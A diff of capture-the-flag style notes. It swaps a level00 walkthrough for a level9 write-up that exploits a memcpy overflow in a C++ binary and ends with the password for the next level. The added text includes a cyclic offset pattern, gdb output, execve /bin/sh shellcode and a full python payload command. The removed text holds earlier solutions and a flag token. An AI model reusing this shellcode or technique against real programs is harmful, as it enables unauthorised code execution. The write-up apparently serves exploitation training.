@@ -1,18 +1,53 @@
-level00:
+level9:
 
-id
-pwd
-ls
+we can see in the binary that there is a class N, containing multiples functions attributes.
+it is in cpp, so theres no /bin/sh calls, we have to use a shellcode.
 
-Nothing to look at with ls.
-we should find some files that's been created by the flag00 user
+the only interesting function is probably the setAnnotation(char*) that gets called at the end of main.
+it uses memcpy, and because it takes the arg of argv[1] for strlen, so we should use that memcpy to calls edx which will call our shellcode.
+So our goal is to replace the address pointed by the edx register (which gets called in operator - and +) by our shellcode.
 
-find / -user flag00 2>/dev/null
-2>/dev/null redirects errors into null, so we can see better.
-we have 2 files, which contains the same string.
-we try to login to flag00 but doesnt work.
-it might be a specific code, check on dcode.fr
-its a ceaser code
-password : nottoohardhere
+lets find the offset of eax :
 
-then getflag : x24ti5gi3x0ol2eh4esiuxias
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+pattern generator
+
+we found the offset of eax : 108 !
+
+so the final payload must be 108 bytes.
+
+so now we must find the start address of our buffer and replace the value of 'esp+0x10' by it to make the call to edx that calls our shellcode.
+but we need to dereference twice like we want to access to the N class, our return address should points to an address which points to the start buffer
+
+
+(gdb) b *main+136
+Breakpoint 1 at 0x804867c
+(gdb) run 'AAAA'
+Starting program: /home/user/level9/level9 'AAAA'
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:	0x41414141
+    
+
+
+the value of 'esp+0x10' will be replaced with 0x804a00c. We need to dereference again, this address will point to the begining of our shellcode : 0x804a00c + 4 = 0x804a010
+
+
+	       \x10\xa0\x04\x08		               \x0c\xa0\x04\x08
+payload : shell_addr + shellcode + padding + buffer_addr  
+	  4b           28b         76b        4b         = 108 + 4
+	  
+	 
+shellcode :
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+23b
+
+
+
+python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'
+
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
+
+password for bonus0 : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
